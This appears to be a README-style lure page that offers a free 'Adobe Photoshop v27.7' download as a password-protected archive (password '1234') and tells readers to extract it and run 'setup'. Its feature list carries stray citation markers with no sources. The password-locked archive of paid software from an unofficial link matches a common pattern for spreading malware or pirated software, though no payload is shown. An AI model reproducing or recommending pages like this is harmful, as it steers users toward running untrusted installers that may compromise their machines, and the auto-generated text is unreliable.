# Adobe Photoshop

Adobe Photoshop is a professional raster graphics editor for Windows and macOS, used for photo editing, digital painting, compositing, and graphic design. It offers powerful tools for image retouching, layer-based workflows, and creative production across professional and personal projects.

## Installation
### [Download Adobe Photoshop v27.7](https://example.com/adobe-photoshop/releases/latest)
> Archive password: `1234`

- Download the Adobe Photoshop archive.
- Extract the archive to a folder.
- Run `setup`.

## Features

- **Layers** for non-destructive editing and compositing[2][4]
- **Selection tools** for isolating objects and details[1][2]
- **Masks** to hide or reveal parts of an image without deleting pixels[4][6]
- **Adjustment layers** for editable color and tone changes[4][6]
- **Content-aware tools** for removing or filling areas intelligently[2][4]
